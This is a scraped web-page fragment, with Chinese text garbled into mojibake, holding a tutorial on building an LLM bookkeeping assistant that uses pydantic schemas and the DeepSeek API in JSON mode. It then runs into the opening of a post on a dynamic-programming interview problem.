            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893870865303/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‘¸é±¼çš„æ˜¥å“¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:16:08.000Z" title="Wed Feb 04 2026 00:16:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ˜¥å“¥çš„Agenté€šå…³ç§˜ç±04ï¼šæ™ºèƒ½è®°è´¦å°ç§˜ä¹¦ã€å®æˆ˜ç¯‡ã€‘</h2>
<p><strong>è¿™ä¸€ç« ä¼šæœ‰å¤§æ®µå¤§æ®µä»£ç å—ï¼Œæå‰å‘ŠçŸ¥ä¸‹ï¼Œä¸»è¦æ˜¯è§£é‡Šdemoçš„æ’°å†™æ€è·¯ï¼Œä¸è®²è§£æ–°çŸ¥è¯†ã€‚</strong></p>
<p>ç›¸å…³çŸ¥è¯†å†…å®¹è¯·çœ‹ä¸Šä¸€ç¯‡ã€‚</p>
<p>demoå‚è€ƒä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhangshichun%2Fai_agent_dev_study" target="_blank" title="https://github.com/zhangshichun/ai_agent_dev_study" ref="nofollow noopener noreferrer">github.com/zhangshichuâ€¦</a></p>
<p>è¿™ç¯‡æˆ‘ä»¬å¯¹æ ¼å¼åŒ–è¾“å‡ºæ‰¾ä¸€ä¸ªç®€å•ä½†å¸¸è§çš„åœºæ™¯è¿›è¡Œå®æˆ˜ã€‚</p>
<p><img src="https://pic.zhangshichun.top/pic/20260204-1.gif" alt="" loading="lazy"/></p>
<p>ç›®æ ‡ï¼šå®ç°è®°è´¦èƒ½åŠ›çš„AIåŠ©ç†ï¼Œå¹¶ä¸”èƒ½åé¦ˆç›¸å…³æƒ…ç»ª</p>
<blockquote>
<p>ç”¨æˆ·è¾“å…¥ï¼šä»Šå¤©èŠ±xxé’±ä¹°äº†ä¸ªxx</p>
</blockquote>
<blockquote>
<p>AIè¾“å‡ºä¸€æ®µç¨³å®šçš„jsonå¯¹è±¡ï¼Œä¸ä»…èƒ½æŠ½ç¦»å‡ºç”¨æˆ·è‡ªç„¶è¯­è¨€é‡Œçš„å­—æ®µï¼Œæƒ…ç»ªï¼Œè¿˜èƒ½ç»™ä¸åé¦ˆã€‚</p>
</blockquote>
<p>æœ‰äº†ä¸Šä¸€èŠ‚çš„çŸ¥è¯†è¡¥å……ï¼Œæœ¬èŠ‚å®æˆ˜å‡ ä¹æ²¡æœ‰é˜»ç¢ã€‚</p>
<h3 data-id="heading-1">01, å®šä¹‰ JSON å¯¹è±¡è·å–SchemaÂ·</h3>
<p>é¦–å…ˆå®‰è£… <code>pydantic</code>:</p>
<pre><code class="hljs language-bash" lang="bash">pip install pydantic
</code></pre>
<p>ç„¶åï¼Œåœ¨ä»£ç é‡Œå¯ä»¥è¿™æ ·åˆ›å»ºä¸€ä¸ª Pydantic å¯¹è±¡:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¼•å…¥ Pydantic çš„æ ¸å¿ƒç»„ä»¶</span>
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šå®šä¹‰å­—æ®µç±»å‹å’Œæè¿°</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AccountItem</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    amount: <span class="hljs-built_in">float</span> = Field(description=<span class="hljs-string">"äº¤æ˜“é‡‘é¢ï¼Œå¿…é¡»æ˜¯æ•°å­—ã€‚å¦‚æœæœªæåŠé‡‘é¢ï¼Œé»˜è®¤ä¸º 0.0"</span>)
    category: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"äº¤æ˜“åˆ†ç±»ï¼Œåªèƒ½ä»ä»¥ä¸‹é€‰æ‹©ï¼š[é¤é¥®, äº¤é€š, è´­ç‰©, å¨±ä¹, å±…å®¶, åŒ»ç–—, å­¦ä¹ , å…¶ä»–]"</span>)
    product: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"å…·ä½“çš„å•†å“æˆ–æœåŠ¡åç§°"</span>)
    sentiment: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"æ¶ˆè´¹æ—¶çš„æƒ…ç»ªï¼Œä¾‹å¦‚ï¼šå¼€å¿ƒ, åæ‚”, å¿ƒç–¼, æœŸå¾…, å¹³æ·¡ ç­‰ç­‰ï¼Œå¯ä»¥è‡ªè¡Œæ€»ç»“"</span>)
    <span class="hljs-comment"># ğŸ”¥ æ–°å¢å­—æ®µï¼šAI çš„æƒ…æ„Ÿåé¦ˆ</span>
    ai_comment: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"æ ¹æ®ç”¨æˆ·çš„æ¶ˆè´¹å†…å®¹å’Œæƒ…ç»ªï¼Œç»™å‡ºä¸€å¥ç®€çŸ­çš„åé¦ˆã€‚å¦‚æœæ˜¯ä¹±èŠ±é’±å¯ä»¥å¹½é»˜åæ§½ï¼Œå¦‚æœæ˜¯å¿…è¦æ¶ˆè´¹ç»™äºˆè‚¯å®šï¼Œå¦‚æœæ˜¯å¿ƒæƒ…ä¸å¥½åˆ™ç»™äºˆå®‰æ…°ã€‚"</span>)

</code></pre>
<p>è¿™ä¸€æ­¥æˆ‘ä»¬é¦–å…ˆæ˜ç¡®äº†æˆ‘ä»¬æ¥ä¸‹æ¥å¸Œæœ›ä» LLM é‚£é‡Œå¾—åˆ°ä»€ä¹ˆæ ·çš„æ•°æ®ï¼š</p>
<ul>
<li>amount</li>
<li>category</li>
<li>product</li>
<li>sentiment æƒ…ç»ª</li>
<li>ai_comment AIè¯„è®º</li>
</ul>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨APIè½»æ¾åœ°æŠŠä»¥ä¸Šå®šä¹‰è½¬æ¢ä¸ºæ ‡å‡†çš„ JSONSchemaã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŠŠ Pydantic ç±»è½¬æ¢æˆ AI èƒ½è¯»æ‡‚çš„ JSON Schema æè¿°</span>
<span class="hljs-comment"># ensure_ascii=False æ˜¯ä¸ºäº†è®©ä¸­æ–‡æ­£å¸¸æ˜¾ç¤ºï¼Œä¸å˜æˆ \uXXXX</span>
schema_str = json.dumps(AccountItem.model_json_schema(), ensure_ascii=<span class="hljs-literal">False</span>)
</code></pre>
<h3 data-id="heading-2">02,ç»„è£…å®Œæ•´çš„System Prompt</h3>
<p>ä¸ŠèŠ‚æˆ‘ä»¬è¯´è¿‡ï¼Œã€ç³»ç»Ÿæç¤ºè¯ã€‘æ˜¯å¼€å‘äººå‘˜è®¾ç½®çš„é™æ€çš„ï¼Œé«˜æƒé‡çš„æç¤ºè¯ã€‚</p>
<p>å› æ­¤ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®ï¼š</p>
<ul>
<li>AI åœ¨æ‰®æ¼”ä»€ä¹ˆè§’è‰²</li>
<li>éœ€è¦å®Œæˆä»€ä¹ˆä»»åŠ¡</li>
<li>éµå¾ªä»€ä¹ˆæ ·çš„è§„åˆ™å’Œè¦æ±‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 2. æ„å»º System Prompt</span>
    system_prompt = <span class="hljs-string">f"""
    ä½ æ˜¯ä¸€ä¸ªä¸ä»…ä¼šè®°è´¦ï¼Œè¿˜å¾ˆæ‡‚å¿ƒç†å­¦çš„è´´å¿ƒåŠ©æ‰‹ã€‚
    è¯·åˆ†æç”¨æˆ·çš„è¾“å…¥ï¼Œæå–å…³é”®ä¿¡æ¯ï¼Œå¹¶ç»™å‡ºæƒ…æ„Ÿåé¦ˆã€‚
    
    ã€é‡è¦è§„åˆ™ã€‘
    1. æ ¹æ®å¸¸è¯†è‡ªåŠ¨æ¨æ–­åˆ†ç±»ã€‚
    2. ä¸¥æ ¼æŒ‰ç…§ä»¥ä¸‹ JSON Schema æ ¼å¼è¾“å‡º JSON æ•°æ®ï¼Œç¦æ­¢åŒ…å« markdownï¼š
    <span class="hljs-subst">{schema_str}</span>
    """</span>
</code></pre>
<h3 data-id="heading-3">03. åˆ›å»º clientå’Œä¼šè¯</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

<span class="hljs-comment"># åŠ è½½ç¯å¢ƒå˜é‡</span>
load_dotenv()
<span class="hljs-comment"># åˆ›å»ºclient</span>
client = OpenAI(
    api_key=os.getenv(<span class="hljs-string">"DEEP_SEEK_API_KEY"</span>), 
    base_url=os.getenv(<span class="hljs-string">"DEEP_SEEK_API_URL"</span>)
)
</code></pre>
<p>ç„¶ååˆ©ç”¨æˆ‘ä»¬å‰å‡ æ­¥æ„å»ºå¥½çš„å‚æ•°å’Œclientæ¥å‘èµ·ä¼šè¯ã€‚</p>
<pre><code class="hljs language-python" lang="python">  <span class="hljs-comment"># 3. è°ƒç”¨å¤§æ¨¡å‹</span>
  response = client.chat.completions.create(
      model=<span class="hljs-string">"deepseek-chat"</span>, 
      messages=[
          {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: system_prompt}, <span class="hljs-comment"># æ³¨å…¥è§„åˆ™</span>
          {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}       <span class="hljs-comment"># æ³¨å…¥æ•°æ®</span>
      ],
      <span class="hljs-comment"># ã€å…³é”®ã€‘å¼ºåˆ¶æ¨¡å‹è¿›å…¥ JSON æ¨¡å¼ï¼Œé˜²æ­¢å®ƒèƒ¡ä¹±è¯´è¯</span>
      response_format={<span class="hljs-string">"type"</span>: <span class="hljs-string">"json_object"</span>} 
  )

  <span class="hljs-comment"># 4. è·å–ç»“æœå­—ç¬¦ä¸²</span>
  json_str = response.choices[<span class="hljs-number">0</span>].message.content
  
  <span class="hljs-comment"># 5. ã€éªŒè¯ã€‘å°† JSON å­—ç¬¦ä¸²å€’å› Pydantic å¯¹è±¡</span>
  data = json.loads(json_str)
  result = AccountItem(**data)
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ <code>AccountItem(**data)</code> è¿™ä¸€æ­¥ï¼Œå¦‚æœè¿”å›çš„å¯¹è±¡ååºåˆ—åŒ–åï¼Œä¸ç¬¦åˆæœ€åˆè®¾è®¡çš„ JSON Schemaæ ¼å¼ï¼Œå®ƒå°±ä¼šæŠ¥é”™ï¼Œä»è€Œé˜»æ–­è„æ•°æ®ç­‰ã€‚</p>
<h3 data-id="heading-4">04. åŠ¨æ€è·å–cliçš„ç”¨æˆ·è¾“å…¥</h3>
<p>åœ¨ python é‡Œï¼Œè¿™éå¸¸å®¹æ˜“ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è·å–ç”¨æˆ·è¾“å…¥</span>
user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">"\nğŸ“ è¯·è¾“å…¥è´¦å•æè¿°: "</span>).strip()
</code></pre>
<p>ä¸ŠèŠ‚è¯¾æˆ‘ä»¬æ€ä¹ˆè¯´çš„æ¥ç€ï¼Ÿç”¨æˆ·è¾“å…¥æœ€å¥½ä½œä¸º <code>User Prompt</code>ï¼Œæ²¡é”™ï¼ŒæŠŠå®ƒåŠ¨æ€ä¼ å…¥ä½œä¸º <code>User Prompt</code> è¿›è¡Œä¼šè¯å³å¯ã€‚</p>
<h3 data-id="heading-5">05. æµ‹è¯•ä»£ç </h3>
<p>å®Œæ•´ä»£ç å¯ä»¥å‚è€ƒdemoå·¥ç¨‹é‡Œçš„æ–‡ä»¶ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhangshichun%2Fai_agent_dev_study%2Fblob%2Fmaster%2Flesson_04%2Flesson_04_structure.py" target="_blank" title="https://github.com/zhangshichun/ai_agent_dev_study/blob/master/lesson_04/lesson_04_structure.py" ref="nofollow noopener noreferrer">github.com/zhangshichuâ€¦</a></p>
<p>å°è¯•è¿è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python .\lesson_04\lesson_04_structure.py
</code></pre>
<p><img src="https://pic.zhangshichun.top/pic/20260204-1.gif" alt="" loading="lazy"/></p>
<p>å¦‚æœæŠŠè¿™ä¸ªä»£ç ç»„è£…åˆ°ä¸€ä¸ª web server ä¸Šï¼Œé‚£å°±èƒ½å®ç°å’Œå‰ç«¯çš„é€šä¿¡äº†ã€‚</p>
<h3 data-id="heading-6">ä¸‹ä¸€æ­¥é¢„å‘Š</h3>
<p>æœ‰äº†æœ¬èŠ‚å’Œä¸ŠèŠ‚çš„ã€ç»“æ„åŒ–ã€‘è¾“å‡ºï¼Œæˆ‘ä»¬æˆåŠŸåšåˆ°äº†å¯ä»¥å‡†ç¡®è®©AIè¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ç»“æ„åŒ–æ•°æ®ã€‚</p>
<p>ä½†ï¼Œè¿™å®é™…ä¸Šæ˜¯æœ€ç®€å•çš„ä¸€æ¬¡æ€§å¯¹è¯ï¼Œæ ¹æœ¬ä¸èƒ½ä»£è¡¨AI Agentçš„æ ¸å¿ƒåœºæ™¯ã€‚</p>
<p>ä½†AIè¿˜æœ‰ä¸€äº›è‡´å‘½çš„å¼±ç‚¹ï¼š</p>
<ul>
<li>ä¸æ“…é•¿ç®—æ•°</li>
<li>è®­ç»ƒé›†ä¸æ˜¯å®æ—¶çš„ï¼Œæ— æ³•çŸ¥é“ä»Šå¤©çš„å¤©æ°”æ€ä¹ˆæ ·ï¼Œç°åœ¨å‡ ç‚¹ç­‰</li>
<li>æ²¡æœ‰è®°å¿†</li>
</ul>
<p>ä¸‹èŠ‚è¯¾å¼€å§‹ï¼Œè®©æˆ‘ä»¬å¼€å§‹ç€æ‰‹è§£å†³è¿™äº›é—®é¢˜ã€‚</p>
<p>æ•¬è¯·æœŸå¾…ï¼</p>
<p><img src="https://pic.zhangshichun.top/pic/ScreenShot_2026-01-26_082327_821.png" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰‘æŒ‡offer-72ã€ç¤¼ç‰©çš„æœ€â¼¤ä»·å€¼]]></title>    <link>https://juejin.cn/post/7602463463106068526</link>    <guid>https://juejin.cn/post/7602463463106068526</guid>    <pubDate>2026-02-04T00:23:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463106068526" data-draft-id="7601169987411525670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" å‰‘æŒ‡offer-72ã€ç¤¼ç‰©çš„æœ€â¼¤ä»·å€¼"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-02-04T00:23:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             å‰‘æŒ‡offer-72ã€ç¤¼ç‰©çš„æœ€â¼¤ä»·å€¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:23:55.000Z" title="Wed Feb 04 2026 00:23:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¢˜â½¬æè¿°</h2>
<p>åœ¨â¼€ä¸ªm Ã— nçš„æ£‹ç›˜çš„æ¯â¼€æ ¼éƒ½æ”¾æœ‰â¼€ä¸ªç¤¼ç‰©ï¼Œæ¯ä¸ªç¤¼ç‰©éƒ½æœ‰â¼€å®šçš„ä»·å€¼ï¼ˆä»·å€¼â¼¤äº 0ï¼‰ã€‚ä½ å¯ä»¥ä»æ£‹ç›˜çš„å·¦ä¸Šâ»†å¼€å§‹æ‹¿æ ¼â¼¦â¾¥çš„ç¤¼ç‰©ï¼Œå¹¶æ¯æ¬¡å‘å³æˆ–è€…å‘ä¸‹ç§»åŠ¨â¼€æ ¼ã€ç›´åˆ°åˆ°è¾¾æ£‹ç›˜çš„å³ä¸‹â»†ã€‚ç»™å®šâ¼€ä¸ªæ£‹ç›˜åŠå…¶ä¸Šâ¾¯çš„ç¤¼ç‰©çš„ä»·å€¼ï¼Œè¯·è®¡ç®—ä½ æœ€å¤šèƒ½æ‹¿åˆ°å¤šå°‘ä»·å€¼çš„ç¤¼ç‰©ï¼Ÿ</p>
<p>å¦‚è¾“â¼Šè¿™æ ·çš„â¼€ä¸ªâ¼†ç»´æ•°ç»„ï¼Œ</p>
<pre><code class="hljs language-txet" lang="txet">[
[1,3,1],
[1,5,1],
[4,2,1]
]
</code></pre>
<p>é‚£ä¹ˆè·¯å¾„ 1â†’3â†’5â†’2â†’1 å¯ä»¥æ‹¿åˆ°æœ€å¤šä»·å€¼çš„ç¤¼ç‰©ï¼Œä»·å€¼ä¸º 12</p>
<h2 data-id="heading-1">æ€è·¯åŠè§£ç­”</h2>
<h3 data-id="heading-2">åŸºç¡€åŠ¨æ€è§„åˆ’</h3>
<p>è¿™é“é¢˜å…¶å®â¼€çœ‹å°±çŸ¥é“æ˜¯åŠ¨æ€è§„åˆ’ï¼Œæ£‹ç›˜ä¸­çš„æ¯ä¸ªâ¼©æ ¼â¼¦ï¼Œéƒ½æ˜¯å’Œä¸Šâ½…ï¼Œæˆ–è€…å·¦â½…çš„æ ¼â¼¦æœ‰å…³ã€‚æ—¢ç„¶æ˜¯åŠ¨æ€è§„åˆ’ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå®šä¹‰çŠ¶æ€ï¼š</p>
<p><code>dp[i][j]</code>è¡¨ç¤ºåˆ°è¾¾(i,j)ä½ç½®æ—¶èƒ½è·å¾—çš„æœ€å¤§ç¤¼ç‰©ä»·å€¼</p>
